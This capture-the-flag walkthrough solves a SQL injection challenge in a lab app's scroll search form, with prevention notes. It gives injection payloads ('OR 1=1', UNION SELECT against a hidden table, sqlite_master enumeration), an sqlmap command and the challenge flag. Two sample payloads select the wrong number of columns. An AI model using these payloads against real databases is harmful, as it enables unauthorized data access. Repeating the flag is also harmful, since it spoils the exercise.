# Shrine Walkthrough

## Challenge Overview
**Difficulty**: Medium  
**Vulnerability**: SQL Injection  
**Flag**: nhc{d3c3pt10n_r3v34ls_truth}

## Story Context
Hattori investigates the Shrine of Deception, where ancient scrolls hold wisdom accessible through clever queries.

## Solution Steps

### Step 1: Access the Challenge
1. Navigate to `/challenge/shrine`
2. Observe the search form for ancient scrolls

### Step 2: Understand the Vulnerability
The search form allows querying scroll titles. The backend uses string concatenation in SQL:
```sql
SELECT title, content FROM scrolls WHERE title LIKE '%{query}%'
```

### Step 3: Test Basic Injection
1. Try a simple payload: `' OR '1'='1`
2. This should return all records from the scrolls table

### Step 4: Discover Hidden Tables
1. Use UNION to access hidden tables
2. Try: `' UNION SELECT hidden_title, hidden_content FROM wisdom_secrets --`
3. This accesses the hidden table containing the flag

### Step 5: Extract the Flag
The query should return:
- Title: Secret Wisdom
- Content: nhc{d3c3pt10n_r3v34ls_truth}

## Hints

### Hint 1
> The shrine holds more than meets the eye. Try to break free from the intended search functionality.

### Hint 2
> SQL injection often involves manipulating WHERE clauses. What happens if you make the condition always true?

### Hint 3
> Look for hidden tables that aren't mentioned in the suggestions. UNION SELECT can reveal secrets.

## Educational Notes

### What You Learned
- **SQL Injection**: Injecting malicious SQL into queries
- **String Concatenation Vulnerabilities**: Never build SQL with string addition
- **UNION Attacks**: Combining results from multiple tables
- **Database Enumeration**: Discovering hidden tables and columns

### Real-World Impact
- Data breaches through SQL injection
- Unauthorized data access
- Database manipulation
- Credential theft

### Prevention
- Use parameterized queries
- Prepared statements
- Input sanitization
- ORM frameworks
- Least privilege database users

## Alternative Payloads

### Basic Injection
```
' OR '1'='1' --
```
Returns all records from scrolls table.

### Table Discovery
```
' UNION SELECT name FROM sqlite_master WHERE type='table' --
```
Lists all tables in the database.

### Column Discovery
```
' UNION SELECT sql FROM sqlite_master WHERE name='wisdom_secrets' --
```
Shows the structure of the hidden table.

### Direct Flag Access
```
' UNION SELECT hidden_title, hidden_content FROM wisdom_secrets --
```

## Common Mistakes
- Forgetting the comment syntax (`--`) to ignore rest of query
- Not handling single quotes properly
- Using wrong table/column names
- Not testing basic injection first

## Testing with SQLMap
```bash
sqlmap -u "http://localhost:5000/challenge/shrine" --data="query=*" --batch
```

## Next Steps
Submit the flag from the hidden table to unlock the Spirit challenge.
